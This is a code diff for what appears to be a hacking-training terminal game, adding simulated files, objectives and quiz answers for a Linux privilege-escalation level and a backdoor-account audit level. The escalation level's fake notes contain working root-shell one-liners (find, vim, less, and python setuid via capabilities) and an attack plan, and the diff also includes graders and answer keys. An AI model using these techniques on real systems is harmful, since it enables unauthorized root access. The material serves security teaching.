+║   find / -perm -6000 2>/dev/null    # Both SUID+SGID          ║
+║                                                               ║
+║ SUDO ANALYSIS:                                                ║
+║   sudo -l                    # What can I sudo?               ║
+║   sudo -V                    # Sudo version (CVE check)       ║
+║   cat /etc/sudoers           # Full sudo config (if readable) ║
+║                                                               ║
+║ WORLD-WRITABLE:                                               ║
+║   find / -perm -o+w -type f 2>/dev/null  # Writable files     ║
+║   find / -perm -o+w -type d 2>/dev/null  # Writable dirs      ║
+║                                                               ║
+║ CAPABILITIES:                                                 ║
+║   getcap -r / 2>/dev/null    # Files with capabilities        ║
+║   # Dangerous: cap_setuid, cap_setgid, cap_sys_admin          ║
+║                                                               ║
+║ COMMON PRIVESC PATHS:                                         ║
+║   - SUID binaries (GTFOBins)                                  ║
+║   - Sudo misconfigurations                                    ║
+║   - Writable /etc/passwd                                      ║
+║   - Cron jobs running as root                                 ║
+║   - Capabilities on binaries                                  ║
+╚═══════════════════════════════════════════════════════════════╝`
+                },
+                '/home/infiltrator/.bashrc': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 256,
+                    content: '# Infiltrator shell config\nexport PS1="[infiltrator@EMBASSY-SRV \\W]$ "\nalias suidscan="find / -perm -4000 -type f 2>/dev/null"\nalias worldwrite="find / -perm -o+w -type f 2>/dev/null"'
                 },
                 '/home/infiltrator/privesc_notes': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
-                    children: ['suid_binaries.txt', 'sudo_rules.txt', 'weak_perms.txt']
+                    children: ['suid_binaries.txt', 'sudo_rules.txt', 'weak_perms.txt', 'README.txt']
+                },
+                '/home/infiltrator/privesc_notes/README.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 384,
+                    content: `PRIVESC RECONNAISSANCE NOTES
+============================
+Operation: EMBASSY BREACH
+Objective: Escalate from infiltrator -> root
+
+Current Access Level: infiltrator (low-priv user)
+Target: root access on EMBASSY-SRV
+
+Strategy:
+1. Enumerate SUID binaries
+2. Check sudo permissions
+3. Find world-writable files
+4. Check for capabilities
+5. Identify weakest path to root`
                 },
                 '/home/infiltrator/privesc_notes/suid_binaries.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 768,
+                    content: `SUID BINARIES DISCOVERED
+========================
+Scan Date: 2026-01-19
+
+STANDARD (expected):
+/usr/bin/passwd         - Password change (normal)
+/usr/bin/sudo           - Sudo binary (normal)
+/usr/bin/su             - Switch user (normal)
+/usr/bin/mount          - Mount filesystems (normal)
+/usr/bin/ping           - ICMP ping (normal)
+
+INTERESTING:
+/usr/bin/find           - GTFOBins: find . -exec /bin/sh -p \\;
+/usr/bin/vim            - GTFOBins: vim -c ':!/bin/sh'
+/usr/local/bin/backup   - CUSTOM BINARY (investigate!)
+
+PRIORITY TARGET: /usr/local/bin/backup
+Reason: Custom binary, likely misconfigured
+Action: Check with strings, ltrace, or run with test input`
+                },
+                '/home/infiltrator/privesc_notes/sudo_rules.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 512,
-                    content: 'SUID BINARIES OF INTEREST\n=========================\n/usr/bin/find - GTFOBins exploit available\n/usr/bin/vim - Can spawn shell\n/opt/custom/backup - Custom binary, investigate\n'
+                    content: `SUDO PERMISSIONS ANALYSIS
+=========================
+Output of sudo -l for infiltrator:
+
+User infiltrator may run the following commands on EMBASSY-SRV:
+    (ALL) NOPASSWD: /usr/bin/python3 /opt/scripts/report.py
+    (ALL) NOPASSWD: /usr/bin/less /var/log/auth.log
+
+ANALYSIS:
+- python3 report.py: Check if report.py is writable!
+- less auth.log: Can spawn shell with !sh
+
+EXPLOITATION NOTES:
+The 'less' command allows shell escape: press !sh while viewing`
+                },
+                '/home/infiltrator/privesc_notes/weak_perms.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 640,
+                    content: `WORLD-WRITABLE FILES FOUND
+==========================
+Scan: find / -perm -o+w -type f 2>/dev/null
+
+CRITICAL:
+/opt/scripts/report.py   - 0777 - JACKPOT! Python script we can sudo
+
+HIGH RISK:
+/var/tmp/cleanup.sh      - 0666 - Possibly cron executed
+/tmp/session_data.txt    - 0777 - Temp file
+
+LOW RISK:
+/var/log/app.log         - 0666 - Just a log file
+/tmp/.X11-unix/*         - 0777 - X11 sockets (normal)
+
+EXPLOITATION PATH IDENTIFIED:
+1. Modify /opt/scripts/report.py
+2. Insert reverse shell or command
+3. Run: sudo /usr/bin/python3 /opt/scripts/report.py
+4. PROFIT: Root shell`
+                },
+                '/home/infiltrator/recon': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
+                    children: ['system_info.txt', 'users.txt', 'capabilities.txt']
+                },
+                '/home/infiltrator/recon/system_info.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 384,
+                    content: `SYSTEM INFORMATION
+==================
+Hostname: EMBASSY-SRV
+OS: Ubuntu 22.04 LTS
+Kernel: 5.15.0-generic
+Architecture: x86_64
+
+Security Notes:
+- AppArmor: enforcing
+- SELinux: disabled
+- Firewall: ufw active
+- No AV detected`
+                },
+                '/home/infiltrator/recon/users.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 256,
+                    content: `USERS ON SYSTEM
+===============
+root:x:0:0:root:/root:/bin/bash
+infiltrator:x:1001:1001::/home/infiltrator:/bin/bash
+admin:x:1000:1000:Administrator:/home/admin:/bin/bash
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false`
+                },
+                '/home/infiltrator/recon/capabilities.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 384,
+                    content: `LINUX CAPABILITIES SCAN
+=======================
+Command: getcap -r / 2>/dev/null
+
+/usr/bin/python3.10 cap_setuid=ep   <<<CRITICAL!
+/usr/bin/ping cap_net_raw=ep
+/usr/bin/mtr-packet cap_net_raw=ep
+
+ANALYSIS:
+python3.10 has cap_setuid capability set!
+This means we can change our UID to 0 (root).
+
+Exploitation:
+python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
+                },
+                '/home/infiltrator/exploits': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'infiltrator', group: 'infiltrator',
+                    children: ['gtfobins_notes.txt', 'attack_plan.txt']
+                },
+                '/home/infiltrator/exploits/gtfobins_notes.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 640,
+                    content: `GTFOBINS REFERENCE
+==================
+Source: https://gtfobins.github.io/
+
+FIND (SUID):
+find . -exec /bin/sh -p \\; -quit
+
+VIM (SUID):
+vim -c ':!/bin/sh'
+
+LESS (SUDO):
+sudo less /var/log/auth.log
+!sh
+
+PYTHON (SUID/SUDO/CAPABILITIES):
+python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+NMAP (SUID, old versions):
+nmap --interactive
+!sh`
+                },
+                '/home/infiltrator/exploits/attack_plan.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'infiltrator', group: 'infiltrator', size: 512,
+                    content: `PRIVILEGE ESCALATION ATTACK PLAN
+=================================
+Operation: EMBASSY BREACH
+Target: root access
+
+MULTIPLE PATHS IDENTIFIED:
+
+Path A - Python Capability (EASIEST):
+   python3 cap_setuid -> instant root shell
+
+Path B - Sudo + Writable Script:
+   Modify report.py -> sudo python3 report.py
+
+Path C - Sudo + Less Shell Escape:
+   sudo less auth.log -> !sh
+
+Path D - SUID Find:
+   find . -exec /bin/sh -p \\; -quit
+
+RECOMMENDATION: Path A (capability exploit)
+Reason: Direct, no file modification needed`
                 },
             },
 
             objectives: [
-                { id: 1, task: 'CHECK: Current Permissions', hint: '$ id && groups', check: (cmd) => cmd.includes('id') || cmd.includes('groups') },
-                { id: 2, task: 'FIND: SUID Binaries', hint: '$ find / -perm -4000 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('4000') },
-                { id: 3, task: 'CHECK: Sudo Permissions', hint: '$ sudo -l', check: (cmd) => cmd.includes('sudo') && cmd.includes('-l') },
-                { id: 4, task: 'FIND: World-Writable', hint: '$ find / -perm -o+w -type f 2>/dev/null', check: (cmd) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('w') },
-                { id: 5, task: 'CHECK: Capabilities', hint: '$ getcap -r / 2>/dev/null', check: (cmd) => cmd.includes('getcap') },
+                { id: 1, task: 'CHECK: Current Permissions', hint: '$ id && groups',
+                  check: (cmd, state, output) => (cmd.includes('id') || cmd.includes('groups') || cmd.includes('whoami')) &&
+                         output && (output.includes('infiltrator') || output.includes('uid=') || output.includes('gid=')) },
+                { id: 2, task: 'FIND: SUID Binaries', hint: '$ find / -perm -4000 2>/dev/null',
+                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-perm') && cmd.includes('4000') &&
+                         output && (output.includes('/usr/bin') || output.includes('suid') || output.includes('backup')) },
+                { id: 3, task: 'CHECK: Sudo Permissions', hint: '$ sudo -l',
+                  check: (cmd, state, output) => cmd.includes('sudo') && cmd.includes('-l') &&
+                         output && (output.includes('NOPASSWD') || output.includes('may run') || output.includes('python')) },
+                { id: 4, task: 'FIND: World-Writable Files', hint: '$ find / -perm -o+w -type f 2>/dev/null',
+                  check: (cmd, state, output) => cmd.includes('find') && cmd.includes('-perm') && (cmd.includes('w') || cmd.includes('777')) &&
+                         output && (output.includes('/opt') || output.includes('/tmp') || output.includes('writable')) },
+                { id: 5, task: 'CHECK: Capabilities', hint: '$ getcap -r / 2>/dev/null',
+                  check: (cmd, state, output) => cmd.includes('getcap') &&
+                         output && (output.includes('cap_') || output.includes('python') || output.includes('setuid')) },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "Which binary has the cap_setuid capability that allows direct privilege escalation?",
+                acceptedAnswers: ["python3", "python3.10", "/usr/bin/python3", "/usr/bin/python3.10", "python"],
+                hint: "Check the capabilities.txt file in the recon directory, or run getcap to find binaries with dangerous capabilities.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "Not quite. Look for a binary with cap_setuid=ep capability.",
+                correctAnswerMessage: "CONFIRMED. Python3.10 has cap_setuid - instant root with: python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+            },
 
             remoteHosts: null,
         },
@@ -4410,29 +6614,281 @@ find / -mtime -1 -type f 2>/dev/null`
             filesystem: {
                 '/home/admin': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
-                    children: ['user_audit', 'scripts', '.bashrc']
+                    children: ['user_audit', 'scripts', 'evidence', '.bashrc', '.bash_history', '.user_mgmt_cheatsheet']
+                },
+                '/home/admin/.bash_history': {
+                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 384,
+                    content: `cat /etc/passwd
+cat /etc/passwd | cut -d: -f1
+getent passwd admin
+groups admin
+cat /etc/group | grep sudo
+passwd -S admin
+chage -l admin
+cat /etc/shells
+grep -v nologin /etc/passwd
+lastlog | head -20`
+                },
+                '/home/admin/.user_mgmt_cheatsheet': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 1792,
+                    content: `╔═══════════════════════════════════════════════════════════════╗
+║              USER MANAGEMENT CHEATSHEET                       ║
+╠═══════════════════════════════════════════════════════════════╣
+║ LIST USERS:                                                   ║
+║   cat /etc/passwd              # All users (full entry)       ║
+║   cat /etc/passwd | cut -d: -f1    # Usernames only           ║
+║   getent passwd                # All users via NSS            ║
+║   compgen -u                   # Bash user completion list    ║
+║                                                               ║
+║ USER DETAILS:                                                 ║
+║   getent passwd <user>         # Full passwd entry            ║
+║   id <user>                    # UID, GID, groups             ║
+║   finger <user>                # User info (if installed)     ║
+║                                                               ║
+║ GROUP MANAGEMENT:                                             ║
+║   groups <user>                # Groups for user              ║
+║   cat /etc/group               # All groups                   ║
+║   getent group <group>         # Group members                ║
+║   id -nG <user>                # Group names for user         ║
+║                                                               ║
+║ PASSWORD STATUS:                                              ║
+║   passwd -S <user>             # Password status              ║
+║   chage -l <user>              # Password aging info          ║
+║   cat /etc/shadow              # Password hashes (root only)  ║
+║                                                               ║
+║ LOGIN SHELLS:                                                 ║
+║   cat /etc/shells              # Valid login shells           ║
+║   grep -v nologin /etc/passwd  # Users with login shells      ║
+║   grep /bin/bash /etc/passwd   # Bash users                   ║
+║                                                               ║
+║ AUDIT COMMANDS:                                               ║
+║   lastlog                      # Last login for all users     ║
+║   last                         # Recent logins                ║
+║   who                          # Currently logged in          ║
+║   w                            # Who + what they're doing     ║
+╚═══════════════════════════════════════════════════════════════╝`
+                },
+                '/home/admin/.bashrc': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 256,
+                    content: '# Admin shell config\nexport PS1="[admin@ADMIN-SRV \\W]$ "\nalias userlist="cat /etc/passwd | cut -d: -f1"\nalias shellcheck="grep -v nologin /etc/passwd"'
                 },
                 '/home/admin/user_audit': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
-                    children: ['user_list.txt', 'group_memberships.txt']
+                    children: ['user_list.txt', 'group_memberships.txt', 'suspicious_accounts.txt', 'README.txt']
+                },
+                '/home/admin/user_audit/README.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 384,
+                    content: `USER AUDIT WORKSPACE
+====================
+Incident: IR-2026-0119
+Task: Identify rogue user accounts
+
+Files:
+- user_list.txt: Current system users with notes
+- group_memberships.txt: Privileged group memberships
+- suspicious_accounts.txt: Accounts flagged for review
+
+Priority: Find the backdoor account created by attacker
+UID range 1000-65533 = regular users (investigate these)`
                 },
                 '/home/admin/user_audit/user_list.txt': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 256,
-                    content: 'SYSTEM USERS\n============\nroot - System administrator\nadmin - Local admin\nbackdoor - SUSPICIOUS (created yesterday)\nguest - Disabled account\n'
+                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
+                    content: `SYSTEM USERS AUDIT
+==================
+Account          UID    Shell           Status
+-------          ---    -----           ------
+root             0      /bin/bash       Normal (system)
+daemon           1      /usr/sbin/nologin   Normal (system)
+bin              2      /usr/sbin/nologin   Normal (system)
+admin            1000   /bin/bash       Normal (legitimate admin)
+svcaccount       1001   /bin/bash       Normal (service account)
+developer        1002   /bin/bash       Normal (dev team)
+s3rv1c3          1003   /bin/bash       SUSPICIOUS - odd naming
+guest            1004   /usr/sbin/nologin   Disabled
+mysql            27     /bin/false      Normal (database)
+www-data         33     /usr/sbin/nologin   Normal (web server)`
+                },
+                '/home/admin/user_audit/group_memberships.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
+                    content: `PRIVILEGED GROUP MEMBERSHIPS
+=============================
+SUDO GROUP (can run sudo):
+- admin
+- s3rv1c3    <<< UNAUTHORIZED! Not in original list
+
+DOCKER GROUP (container access):
+- admin
+- developer
+
+WHEEL GROUP:
+- admin
+
+ADM GROUP (log access):
+- admin
+- svcaccount
+
+WARNING: s3rv1c3 was added to sudo group on 2026-01-15
+This account did not exist before the incident.`
+                },
+                '/home/admin/user_audit/suspicious_accounts.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 640,
+                    content: `SUSPICIOUS ACCOUNTS IDENTIFIED
+==============================
+Account: s3rv1c3 (UID 1003)
+Created: 2026-01-15 02:52:33
+Shell: /bin/bash
+Groups: s3rv1c3, sudo
+Home: /home/s3rv1c3
+
+RED FLAGS:
+1. Leet-speak naming (evasion attempt)
+2. Added to sudo group immediately
+3. Created at 02:52 (same timeframe as malware)
+4. No corresponding ticket or change request
+5. Home directory contains .ssh with authorized_keys
+
+RECOMMENDATION: Disable and investigate
+Command: usermod -L s3rv1c3 && usermod -s /usr/sbin/nologin s3rv1c3`
                 },
                 '/home/admin/scripts': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
-                    children: ['add_user.sh', 'audit_users.sh']
+                    children: ['add_user.sh', 'audit_users.sh', 'disable_user.sh']
+                },
+                '/home/admin/scripts/add_user.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 256,
+                    content: '#!/bin/bash\n# Safe user creation script\n# Usage: ./add_user.sh username\n\nif [ -z "$1" ]; then\n  echo "Usage: $0 username"\n  exit 1\nfi\n\nuseradd -m -s /bin/bash "$1"\npasswd "$1"\necho "User $1 created"'
+                },
+                '/home/admin/scripts/audit_users.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 384,
+                    content: '#!/bin/bash\n# User audit script\necho "=== USERS WITH LOGIN SHELLS ==="\ngrep -v nologin /etc/passwd | grep -v /bin/false\necho ""\necho "=== SUDO GROUP MEMBERS ==="\ngetent group sudo\necho ""\necho "=== RECENT LOGINS ==="\nlastlog | grep -v "Never logged in" | head -10'
+                },
+                '/home/admin/scripts/disable_user.sh': {
+                    type: 'file', perms: '-rwxr-xr-x', owner: 'admin', group: 'admin', size: 256,
+                    content: '#!/bin/bash\n# Disable user account safely\nif [ -z "$1" ]; then\n  echo "Usage: $0 username"\n  exit 1\nfi\n\nusermod -L "$1"\nusermod -s /usr/sbin/nologin "$1"\necho "User $1 disabled"'
+                },
+                '/home/admin/evidence': {
+                    type: 'dir', perms: 'drwxr-xr-x', owner: 'admin', group: 'admin',
+                    children: ['passwd_snapshot.txt', 'shadow_hashes.txt', 'timeline.txt']
+                },
+                '/home/admin/evidence/passwd_snapshot.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 768,
+                    content: `PASSWD FILE SNAPSHOT - 2026-01-19
+==================================
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+admin:x:1000:1000:Administrator:/home/admin:/bin/bash
+svcaccount:x:1001:1001:Service Account:/home/svcaccount:/bin/bash
+developer:x:1002:1002:Developer:/home/developer:/bin/bash
+s3rv1c3:x:1003:1003::/home/s3rv1c3:/bin/bash
+guest:x:1004:1004:Guest:/home/guest:/usr/sbin/nologin`
+                },
+                '/home/admin/evidence/shadow_hashes.txt': {
+                    type: 'file', perms: '-rw-------', owner: 'admin', group: 'admin', size: 256,
+                    content: `SHADOW ANALYSIS (hashes redacted)
+==================================
+s3rv1c3 password analysis:
+- Hash type: $6$ (SHA-512)
+- Last changed: 2026-01-15 (day of compromise)
+- Expires: Never
+- Account status: Active
+
+NOTE: Password was set when account created
+Likely a known credential for attacker access`
+                },
+                '/home/admin/evidence/timeline.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'admin', group: 'admin', size: 512,
+                    content: `ACCOUNT CREATION TIMELINE
+=========================
+Correlated with dpkg.log and auth.log:
+
+2026-01-15 02:47:33 - ncat installed
+2026-01-15 02:48:15 - socat installed
+2026-01-15 02:51:07 - netminer installed
+2026-01-15 02:52:33 - s3rv1c3 account created  <<<
+2026-01-15 02:52:45 - s3rv1c3 added to sudo group
+2026-01-15 02:53:01 - SSH key added to s3rv1c3
+
+CONCLUSION: Account created for persistent backdoor access
+exactly 1 minute after malware installation.`
+                },
+                '/etc/passwd': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 768,
+                    content: `root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/false
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+admin:x:1000:1000:Administrator:/home/admin:/bin/bash
+svcaccount:x:1001:1001:Service Account:/home/svcaccount:/bin/bash
+developer:x:1002:1002:Developer:/home/developer:/bin/bash
+s3rv1c3:x:1003:1003::/home/s3rv1c3:/bin/bash
+guest:x:1004:1004:Guest:/home/guest:/usr/sbin/nologin`
+                },
+                '/etc/group': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 384,
+                    content: `root:x:0:
+daemon:x:1:
+bin:x:2:
+sys:x:3:
+adm:x:4:admin,svcaccount
+sudo:x:27:admin,s3rv1c3
+www-data:x:33:
+docker:x:999:admin,developer
+admin:x:1000:
+svcaccount:x:1001:
+developer:x:1002:
+s3rv1c3:x:1003:
+guest:x:1004:`
+                },
+                '/etc/shells': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 128,
+                    content: `/bin/sh
+/bin/bash
+/usr/bin/bash
+/bin/rbash
+/usr/bin/rbash
+/bin/dash
+/usr/bin/dash
+/usr/bin/zsh`
                 },
             },
 
             objectives: [
-                { id: 1, task: 'LIST: User Accounts', hint: '$ cat /etc/passwd | cut -d: -f1', check: (cmd) => cmd.includes('passwd') },
-                { id: 2, task: 'CHECK: User Details', hint: '$ getent passwd admin', check: (cmd) => cmd.includes('getent') || cmd.includes('finger') },
-                { id: 3, task: 'LIST: Group Memberships', hint: '$ groups admin (or cat /etc/group)', check: (cmd) => cmd.includes('groups') || (cmd.includes('cat') && cmd.includes('group')) },
-                { id: 4, task: 'CHECK: Password Status', hint: '$ passwd -S admin (or chage -l)', check: (cmd) => cmd.includes('passwd') && cmd.includes('-S') || cmd.includes('chage') },
-                { id: 5, task: 'AUDIT: Login Shells', hint: '$ cat /etc/shells && grep -v nologin /etc/passwd', check: (cmd) => cmd.includes('shells') || cmd.includes('nologin') },
+                { id: 1, task: 'LIST: User Accounts', hint: '$ cat /etc/passwd | cut -d: -f1',
+                  check: (cmd, state, output) => cmd.includes('passwd') &&
+                         output && (output.includes('root') || output.includes('admin') || output.includes('s3rv1c3')) },
+                { id: 2, task: 'CHECK: User Details', hint: '$ getent passwd s3rv1c3',
+                  check: (cmd, state, output) => (cmd.includes('getent') || cmd.includes('id ')) &&
+                         output && (output.includes('1003') || output.includes('/home/') || output.includes(':x:')) },
+                { id: 3, task: 'LIST: Group Memberships', hint: '$ groups admin (or cat /etc/group)',
+                  check: (cmd, state, output) => (cmd.includes('groups') || (cmd.includes('cat') && cmd.includes('group'))) &&
+                         output && (output.includes('sudo') || output.includes('admin') || output.includes('docker')) },
+                { id: 4, task: 'CHECK: Password Status', hint: '$ passwd -S admin (or chage -l)',
+                  check: (cmd, state, output) => ((cmd.includes('passwd') && cmd.includes('-S')) || cmd.includes('chage')) &&
+                         output && (output.includes('Password') || output.includes('Last') || output.includes('Expire')) },
+                { id: 5, task: 'AUDIT: Login Shells', hint: '$ grep -v nologin /etc/passwd',
+                  check: (cmd, state, output) => (cmd.includes('shells') || cmd.includes('nologin') || cmd.includes('/bin/bash')) &&
+                         output && (output.includes('bash') || output.includes('/bin/sh') || output.includes('admin')) },
             ],
+
+            insightPhase: {
+                enabled: true,
+                question: "What is the username of the backdoor account created by the attacker?",
+                acceptedAnswers: ["s3rv1c3", "S3RV1C3"],
+                hint: "Look for accounts with suspicious naming patterns (leet-speak) created around the time of the incident.",
+                hintAfterAttempts: 3,
+                wrongAnswerMessage: "That's not the backdoor account. Look for unusual naming patterns in the user audit.",
+                correctAnswerMessage: "CONFIRMED. s3rv1c3 (leet-speak for 'service') - created at 02:52:33, added to sudo group. Textbook persistence technique."
+            },
 
             remoteHosts: null,
         },
